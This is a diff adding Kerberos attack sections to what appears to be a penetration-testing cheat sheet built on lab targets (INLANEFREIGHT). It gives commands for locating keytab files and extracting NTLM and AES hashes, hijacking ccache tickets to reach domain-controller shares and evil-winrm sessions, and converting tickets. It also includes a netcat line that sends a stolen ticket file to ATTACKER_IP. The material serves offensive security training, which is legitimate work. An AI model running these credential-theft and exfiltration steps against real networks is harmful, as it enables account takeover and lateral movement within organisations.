@@ -185,6 +185,160 @@ To get NTLM from password:
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 ```
 
+## Keytab File Extraction
+
+Find keytab files on a compromised Linux host:
+
+```bash
+find / -name *keytab* -ls 2>/dev/null
+find / -name '*.kt*' -ls 2>/dev/null
+```
+
+Extract hashes from a keytab file:
+
+```bash
+python3 keytabextract.py /opt/specialfiles/carlos.keytab
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : carlos/
+	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
+```
+
+### Import and Use a Keytab
+
+```bash
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /path/to/svc_workstations.kt
+smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
+```
+
+### SSH with Kerberos Principal
+
+```bash
+ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
+```
+
+---
+
+## Ccache Impersonation
+
+Ccache files store Kerberos tickets on Linux. Look for them in `/tmp`:
+
+```bash
+ls -la /tmp
+# Look for files like: krb5cc_647401106_EcdLGj
+```
+
+### Check Ccache Validity
+
+```bash
+klist -c /tmp/krb5cc_647401106_JWxczE
+Ticket cache: FILE:/tmp/krb5cc_647401106_JWxczE
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+03/06/2026 02:04:14  03/06/2026 12:04:14  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+```
+
+### Use a Ccache File
+
+```bash
+export KRB5CCNAME=/tmp/krb5cc_647401106_JWxczE
+
+# Access shares
+smbclient //dc01/C$ -k -c ls -no-pass
+
+# Interactive SMB session
+smbclient //DC01/julio -N
+
+# Evil-WinRM with Kerberos
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
+
+### Use Ccache Through a Proxy
+
+```bash
+export KRB5CCNAME=/tmp/ccache_file.txt
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+```
+
+### Linikatz — Machine Account Authentication
+
+Use linikatz to authenticate with the machine's Kerberos ticket:
+
+```bash
+# Check the SSS ticket cache
+export KRB5CCNAME=FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+klist
+smbclient //DC01/linux01 -N
+```
+
+---
+
+## Ticket Conversion
+
+Convert between ccache (Linux) and kirbi (Windows) formats:
+
+```bash
+# ccache to kirbi
+impacket-ticketConverter /tmp/julio.ccache julio.kirbi
+
+# kirbi to ccache
+impacket-ticketConverter ticket.kirbi ticket.ccache
+```
+
+**Note:** If the ccache is already in the correct format for your tool, don't convert it — just set `KRB5CCNAME`.
+
+---
+
+## Transfer Ccache Off Target
+
+When you need to exfiltrate a ccache file from a compromised Linux host:
+
+```bash
+# On target
+nc ATTACKER_IP 1234 < /tmp/krb5cc_647401106_JWxczE
+
+# On attacker
+nc -nvlp 1234 > stolen.ccache
+```
+
+---
+
+## krb5.conf Setup
+
+For Kerberos authentication to work from your attack machine, configure `/etc/krb5.conf`:
+
+```ini
+[libdefaults]
+ default_realm = INLANEFREIGHT.LOCAL
+ rdns = false
+
+[realms]
+ INLANEFREIGHT.LOCAL = {
+     kdc = dc01.inlanefreight.local
+     admin_server = dc01.inlanefreight.local
+ }
+```
+
+### /etc/hosts Setup
+
+```
+10.129.234.174 inlanefreight.local   inlanefreight   dc01.inlanefreight.local  dc01
+```
+
+Verify DNS resolution:
+
+```bash
+getent hosts dc01.inlanefreight.local
+10.129.234.174  inlanefreight.local inlanefreight dc01.inlanefreight.local dc01
+```
+
+---
+
 ## Tools
 
 * [Impacket](https://github.com/SecureAuthCorp/impacket)
